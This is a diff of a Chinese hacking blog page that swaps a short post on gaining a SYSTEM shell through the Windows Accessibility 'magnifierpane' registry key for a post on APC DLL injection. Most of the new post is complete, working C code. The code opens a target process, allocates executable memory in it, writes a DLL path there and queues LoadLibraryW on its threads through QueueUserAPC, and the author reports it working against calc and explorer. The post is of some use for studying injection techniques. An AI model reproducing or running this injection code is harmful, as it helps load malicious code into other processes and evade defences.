@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="utf-8">
-  <title>另一种获得系统SHELL的方法 - 辅助技术 | 九世的博客</title>
-  <meta name="keywords" content=" Writing ">
-  <meta name="description" content="另一种获得系统SHELL的方法 - 辅助技术 | 九世的博客">
+  <title>APC dll注入 | 九世的博客</title>
+  <meta name="keywords" content="">
+  <meta name="description" content="APC dll注入 | 九世的博客">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="Become a hacker">
 <meta property="og:type" content="website">
@@ -1480,25 +1480,19 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-另一种获得系统SHELL的方法-辅助技术" class="article article-type-post" itemscope="" itemprop="blogPost">
+        <article id="post-APC-dll注入" class="article article-type-post" itemscope="" itemprop="blogPost">
     
-        <h1 class="article-title">另一种获得系统SHELL的方法 - 辅助技术</h1>
+        <h1 class="article-title">APC dll注入</h1>
     
     <div class="article-meta">
         
         
         
-        
-        <span class="tag">
-            
-            <a href="javascript:" class="color3">Writing</a>
-            
-        </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title="更新时间: 2019-04-19 20:36:16">2018-09-07 22:43</time>
+        创建时间:<time class="date" title="更新时间: 2020-09-24 12:32:05">2020-09-24 12:27</time>
         
     </div>
     <div class="article-meta">
@@ -1520,7 +1514,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#这里做一个简单的纪录"><span class="toc-text">这里做一个简单的纪录</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#原理和要求"><span class="toc-text">原理和要求</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#实验"><span class="toc-text">实验</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -1535,8 +1529,134 @@
 </div>
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="这里做一个简单的纪录"><a href="#这里做一个简单的纪录" class="headerlink" title="这里做一个简单的纪录"></a>这里做一个简单的纪录</h2><p>原文是来自：<a href="https://oddvar.moe/2018/07/23/another-way-to-get-to-a-system-shell/" target="_blank" rel="noopener">Another way to get to a system shell – Assistive Technology – Oddvar Moe’s Blog</a><br><img src="https://s1.ax1x.com/2018/09/07/iPQBx1.png" alt="iPQBx1.png"></p>
-<p>运行regedit<br><img src="https://s1.ax1x.com/2018/09/07/iPQrKx.png" alt="iPQrKx.png"><br>在注册表里找到<code>HKEY_LOCAL_MACHINE \ SOFTWARE \ Microsoft \ Windows NT \ CurrentVersion \ Accessibility \ ATs \ magnifierpane</code><br><img src="https://s1.ax1x.com/2018/09/07/iPQgaD.png" alt="iPQgaD.png"><br>然后给权限这个项目，修改值就好<br>给注册表权限：<a href="http://www.beihaiting.com/a/XTJC/WXP/20150816/7337_2.html" target="_blank" rel="noopener">http://www.beihaiting.com/a/XTJC/WXP/20150816/7337_2.html</a><br>测试结果：<br><img src="https://s1.ax1x.com/2018/09/07/iPQWPH.md.png" alt="iPQWPH.md.png"><br>转载请声明：转自422926799.github.io</p>
+        <h2 id="原理和要求"><a href="#原理和要求" class="headerlink" title="原理和要求"></a>原理和要求</h2><p>APC注入原理：<br>APC注入的原理是利用线程被唤醒时APC中的主从函数会被执行的机制，并以此去执行我们的DLL加载代码，进而完成DLL注入。</p>
+<p>APC注入要求：</p>
+<pre><code>1.必须是多线程环境下
+2.注入的程序必须会调用上面的那些同步对象.
+那么我们可以注入APC,注意下条件,也不是所有都能注入的.
+注入方法的原理:
+1.当对面程序执行到某一个上面的等待函数的时候,系统会产生一个中断
+2.当线程唤醒的时候,这个线程会优先去Apc队列中调用回调函数
+3.我们利用QueueUserApc,往这个队列中插入一个回调
+4.插入回调的时候,把插入的回调地址改为LoadLibrary,插入的参数我们使用VirtualAllocEx申请内存,并且写入进去
+</code></pre><h2 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h2><pre><code class="c">#include &quot;stdafx.h&quot;
+#include&lt;Windows.h&gt;
+#include &lt;tlhelp32.h&gt;
+#include &lt;iostream&gt;
+#include &lt;string&gt;
+void GetErr() {
+        printf(&quot;Error:%d&quot;, GetLastError());
+        printf(&quot;\n&quot;);
+        exit(1);
+}
+int getprocess(WCHAR *processname) {
+        HANDLE  data = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+        if (data == INVALID_HANDLE_VALUE) {
+               printf(&quot;[-] CreateToolhelp32Snapshot failure&quot;);
+               GetErr();
+        }
+        else {
+               PROCESSENTRY32W pe = { sizeof(pe) };
+               printf(&quot;[*] CreateToolhelp32Snapshot Sucess\n&quot;);
+               for (bool dd = Process32FirstW(data, &amp;pe);dd;dd = Process32NextW(data,  &amp;pe)) {
+                       WCHAR *pname = pe.szExeFile;
+                       int pid = pe.th32ProcessID;
+                       if (wcscmp(processname, pname) == 0) {
+                              WCHAR info[650] =TEXT(&quot;name:&quot;);
+                              lstrcatW(info, pname);
+                              lstrcatW(info, TEXT(&quot; &quot;));
+                              wprintf(info);
+                              wprintf(TEXT(&quot;pid:&quot;));
+                              printf(&quot;%d\n&quot;, pid);
+                              return pid;
+                       }
+               }
+        }
+        return 0;
+}
+BOOL apcinject(int pid,WCHAR *dll) {
+        HANDLE openprocess = OpenProcess(PROCESS_ALL_ACCESS,0 ,pid);
+        if (openprocess == 0) {
+               GetErr();
+        }
+        else {
+               printf(&quot;[*] OpenProcess Sucess\n&quot;);
+        }
+        LPVOID vt = VirtualAllocEx(openprocess, 0, 1024, MEM_COMMIT,  PAGE_EXECUTE_READWRITE);
+        if (vt == 0) {
+               printf(&quot;[-] VirtualAllocEx faliure\n&quot;);
+               GetErr();
+        }
+        else {
+               printf(&quot;[*] VirtualAllocEx Sucess\n&quot;);
+        }
+        SIZE_T dwRet;
+        bool write = WriteProcessMemory(openprocess, vt, dll, MAX_PATH, &amp;dwRet);
+        if (write == 0) {
+               printf(&quot;[-] WriteProcessMemory faiure&quot;);
+               GetErr();
+        }
+        else {
+               printf(&quot;[*] WriteProcessMemory Sucess\n&quot;);
+        }
+        THREADENTRY32 te = { sizeof(te) };
+        HANDLE handleSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+        if (handleSnap == INVALID_HANDLE_VALUE)
+        {
+               printf(&quot;[-] CreateToolhelp32Snapshot faiure&quot;);
+               GetErr();
+        }else {
+               printf(&quot;[*] CreateToolhelp32Snapshot Sucess\n&quot;);
+               /*
+               if (Thread32First(handleSnap, &amp;te))
+               {
+                       do {
+                              if (te.th32OwnerProcessID == pid)
+                              {
+                                      printf(&quot;%d\n&quot;, te.th32OwnerProcessID);
+                              }
+                       } while (Thread32Next(handleSnap, &amp;te));
+               }
+                       */
+               for (bool td = Thread32First(handleSnap, &amp;te);td;td =  Thread32Next(handleSnap, &amp;te)) {
+                       if (te.th32OwnerProcessID == pid) {
+                              int tid = te.th32ThreadID;
+                              HANDLE openthread = OpenThread(THREAD_ALL_ACCESS, 0, tid);
+                              if (openthread == 0) {
+                                      printf(&quot;[-] OpenThread faiure&quot;);
+                                      GetErr();
+                              }
+                              else {
+                                      printf(&quot;[*] OpenThread Sucess threadid:%d\n&quot;,tid);
+                                      DWORD dwRet = QueueUserAPC((PAPCFUNC)LoadLibraryW,  openthread, (ULONG_PTR)vt);
+                                      if (dwRet == 0) {
+                                             printf(&quot;[-] QueueUserAPC failure\n&quot;);
+                                             GetErr();
+                                      }
+                                      else {
+                                             printf(&quot;[+] APC Dll inject Sucess\n&quot;);
+                                      }
+                              }
+                       }
+
+               }
+        }
+        return true;
+}
+int main()
+{
+        WCHAR *name = TEXT(&quot;calc.exe&quot;);
+        WCHAR *dll = TEXT(&quot;C:\\Users\\JiuShi\\Desktop\\testdll.dll&quot;);
+        int pid = getprocess(name);
+        if (pid != 0) {
+               apcinject(pid, dll);
+        }
+        system(&quot;pause&quot;);
+    return 0;
+}
+</code></pre>
+<p><img src="https://s1.ax1x.com/2020/09/24/wzcGgU.png" alt=""></p>
+<p>试了一下，explorer、calc都能注</p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
@@ -1546,12 +1666,12 @@
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>另一种获得系统SHELL的方法 - 辅助技术</p>
+    <p><span class="copy-title">文章标题:</span>APC dll注入</p>
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="九世">九世</a></p>
-    <p><span class="copy-title">发布时间:</span>2018-09-07, 22:43:05</p>
-    <p><span class="copy-title">最后更新:</span>2019-04-19, 20:36:16</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/f638278f.html" title="另一种获得系统SHELL的方法 - 辅助技术">http://422926799.github.io/posts/f638278f.html</a>
+    <p><span class="copy-title">发布时间:</span>2020-09-24, 12:27:53</p>
+    <p><span class="copy-title">最后更新:</span>2020-09-24, 12:32:05</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/c9faf9c0.html" title="APC dll注入">http://422926799.github.io/posts/c9faf9c0.html</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
